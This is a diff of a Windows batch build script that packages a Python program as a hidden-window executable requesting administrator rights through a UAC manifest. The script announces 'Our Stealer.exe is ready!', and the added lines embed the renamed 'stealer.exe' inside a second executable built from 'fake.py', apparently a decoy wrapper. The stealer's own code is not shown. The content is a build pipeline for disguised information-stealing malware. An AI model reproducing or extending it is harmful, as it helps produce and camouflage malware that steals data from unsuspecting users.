@@ -3,7 +3,7 @@ pip install pyinstaller
 
 echo Starting PyInstaller...
 
-pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest .\main.py
+pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest main.py
 
 echo PyInstaller Finished!
 set scriptDir=%~dp0
@@ -18,6 +18,7 @@ powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
 powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"
 
 DEL main.spec
+DEL final_stealer.exe
 echo Temporary files deleted!
 
 if exist stealer.exe (
@@ -33,3 +34,6 @@ if exist main.exe (
 echo Our Stealer.exe is ready!
 
 wsl bash wsl.sh
+
+ren final_stealer.exe stealer.exe
+pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest --add-data "stealer.exe;." .\fake.py
